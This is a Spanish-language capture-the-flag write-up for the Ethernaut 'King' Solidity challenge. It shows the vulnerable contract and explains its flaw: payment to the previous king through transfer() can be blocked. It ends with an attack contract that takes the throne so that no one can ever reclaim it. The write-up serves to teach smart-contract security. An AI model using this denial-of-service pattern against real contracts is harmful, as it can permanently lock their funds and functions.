# 9-King
## Objetivo:
Este contrato es un juego donde quien aporta más ether pasa a ser el nuevo Rey del contrato. El objetivo es romperlo y que nadie pueda reclamar el "trono".

## Contrato
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

## Análisis del contrato
* Posee la variable King que acepta ether y es del tipo **_address_**
* Posee la variable prize, que es pública y es un entero
* Posee la variable owner que es pública acepta ether y es del tipo **_address_**
* El constructor setea la variable owner,king y a quién deploya el contrato, y la variable prize con el valor con el que se deploya
* La función king() que retorna la variable king
* La función receive() que por defecto es una función para recibir ether. En esta función se valida que cuando se envia ether a esta dirección, el valor enviado sea
mayor al valor actual de la variable prize o que quién envía la transacción sea el owner del contrato. Si cualquiera de estas dos condiciones se cumple, transfiere al 
actual rey el valor enviado en la transacción, asigna al sender como el nuevo rey y asigna el valor enviado como el nuevo prize.

## Solución
Para poder resolver este reto, lo que debemos lograr es que nadie pueda volver a reclamar el "trono". El detalle se encuentra en la línea ```king.transfer(msg.value);```
, utilizando la función transfer() se asume que la transacción va a salir OK ya que con transfer no podemos manejar errores sino que genera una excepción.
Entonces vamos a realizar un nuevo contrato, que reclame el trono por una única vez. Cuando otra dirección quiera reclamar el trono y le envíe eth no va a poder recibirlo
ya que no poseerá ninguna función para hacerlo por lo que el contrato original quedaría por siempre inutilizado.
```Solidity
contract hackKing {
    
    address payable public owner;
    address public king = ADDRESS DE TU INSTANCIA KING;

    constructor() public payable{
        owner = msg.sender;
    }

    function hack() public payable{
        (bool sent, ) = king.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

}
```
Una vez deployado el contrato malicioso en Remix, llamamos a la función hack() y luego validamos que la dirección de nuestro contrato sea el rey.
Si esto es correcto, realizamos el submit de la instancia y listo! Reto completado.
